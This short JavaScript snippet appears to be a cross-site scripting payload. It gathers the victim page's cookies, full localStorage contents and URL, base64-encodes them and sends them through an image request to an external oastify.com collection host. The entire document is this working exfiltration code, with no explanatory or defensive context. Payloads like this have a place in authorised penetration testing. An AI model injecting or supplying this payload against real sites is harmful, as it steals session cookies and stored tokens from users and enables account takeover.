const data = {
  cookie: document.cookie,
  localStorage: JSON.stringify(localStorage),
  url: location.href
};
new Image().src = "https://ebt4xhwz0ffgihdddc7oqtkympsgg84x.oastify.com/leak?" + btoa(JSON.stringify(data));
